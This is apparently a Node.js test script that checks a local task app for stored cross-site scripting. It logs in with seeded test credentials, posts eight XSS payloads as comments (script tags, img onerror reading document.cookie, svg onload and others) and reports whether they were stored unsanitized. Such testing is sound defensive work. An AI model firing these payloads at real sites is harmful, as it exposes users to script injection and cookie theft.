#!/usr/bin/env node

/**
 * XSS Testing Script
 * This script tests the XSS vulnerability by posting malicious payloads to comments
 */

const axios = require('axios');

const BASE_URL = 'http://localhost:3001';

// XSS payloads to test
const XSS_PAYLOADS = [
  "<script>alert('XSS Test')</script>",
  "<img src=x onerror='alert(document.cookie)'>",
  "<svg onload='alert(\"XSS via SVG\")'>",
  "<iframe src='javascript:alert(\"XSS\")'></iframe>",
  "<body onload='alert(\"XSS\")'>",
  "<input onfocus='alert(\"XSS\")' autofocus>",
  "<details open ontoggle='alert(\"XSS\")'>",
  "<marquee onstart='alert(\"XSS\")'>"
];

async function login(email, password) {
  try {
    const response = await axios.post(`${BASE_URL}/api/auth/login`, {
      email,
      password
    });
    
    if (response.data && response.data.token) {
      console.log(`✅ Logged in as ${email}`);
      return response.data.token;
    }
  } catch (error) {
    console.error(`❌ Login failed for ${email}:`, error.response?.data?.error || error.message);
    return null;
  }
}

async function getTasks(token) {
  try {
    const response = await axios.get(`${BASE_URL}/api/tasks`, {
      headers: { Authorization: `Bearer ${token}` }
    });
    
    return response.data || [];
  } catch (error) {
    console.error('❌ Failed to get tasks:', error.response?.data?.error || error.message);
    return [];
  }
}

async function postXSSComment(token, taskId, payload) {
  try {
    const response = await axios.post(`${BASE_URL}/api/comments/task/${taskId}`, {
      content: payload
    }, {
      headers: { Authorization: `Bearer ${token}` }
    });
    
    if (response.status === 201) {
      console.log(`✅ XSS payload posted successfully to task ${taskId}`);
      console.log(`   Payload: ${payload}`);
      return true;
    }
  } catch (error) {
    console.error(`❌ Failed to post XSS payload:`, error.response?.data?.error || error.message);
    return false;
  }
}

async function getComments(token, taskId) {
  try {
    const response = await axios.get(`${BASE_URL}/api/comments/task/${taskId}`, {
      headers: { Authorization: `Bearer ${token}` }
    });
    
    return response.data.comments || [];
  } catch (error) {
    console.error(`❌ Failed to get comments:`, error.response?.data?.error || error.message);
    return [];
  }
}

async function testXSS() {
  console.log('🚨 Starting XSS Vulnerability Test');
  console.log('=' .repeat(50));
  
  // Login as Alice
  const token = await login('alice@example.com', 'password123');
  if (!token) {
    console.error('❌ Cannot proceed without authentication');
    return;
  }
  
  // Get available tasks
  const tasks = await getTasks(token);
  if (tasks.length === 0) {
    console.error('❌ No tasks available for testing');
    return;
  }
  
  const testTaskId = tasks[0].id;
  console.log(`📋 Using task ID ${testTaskId} for testing: "${tasks[0].title}"`);
  console.log('');
  
  // Test each XSS payload
  let successCount = 0;
  for (let i = 0; i < XSS_PAYLOADS.length; i++) {
    const payload = XSS_PAYLOADS[i];
    console.log(`🧪 Testing payload ${i + 1}/${XSS_PAYLOADS.length}:`);
    console.log(`   ${payload}`);
    
    const success = await postXSSComment(token, testTaskId, payload);
    if (success) {
      successCount++;
    }
    console.log('');
  }
  
  // Verify payloads are stored
  console.log('🔍 Verifying stored comments...');
  const comments = await getComments(token, testTaskId);
  const xssComments = comments.filter(comment => 
    XSS_PAYLOADS.some(payload => comment.content.includes(payload.substring(0, 10)))
  );
  
  console.log(`📊 Results:`);
  console.log(`   Payloads sent: ${XSS_PAYLOADS.length}`);
  console.log(`   Successfully posted: ${successCount}`);
  console.log(`   XSS comments found: ${xssComments.length}`);
  console.log('');
  
  if (xssComments.length > 0) {
    console.log('🚨 VULNERABILITY CONFIRMED: XSS payloads stored without sanitization!');
    console.log('');
    console.log('📝 Stored XSS payloads:');
    xssComments.forEach((comment, index) => {
      console.log(`   ${index + 1}. ${comment.content}`);
    });
    console.log('');
    console.log('⚠️  These payloads will execute when the comments are viewed in the browser!');
    console.log(`🌐 View them at: http://localhost:3000/tasks/${testTaskId}`);
  } else {
    console.log('✅ No XSS vulnerability detected - payloads were sanitized');
  }
  
  console.log('');
  console.log('🔗 To test manually:');
  console.log('   1. Open http://localhost:3000');
  console.log('   2. Login with alice@example.com / password123');
  console.log(`   3. Go to task ${testTaskId}`);
  console.log('   4. Add a comment with: <img src=x onerror="alert(document.cookie)">');
  console.log('   5. The alert should execute when the page loads');
}

// Run the test
testXSS().catch(console.error);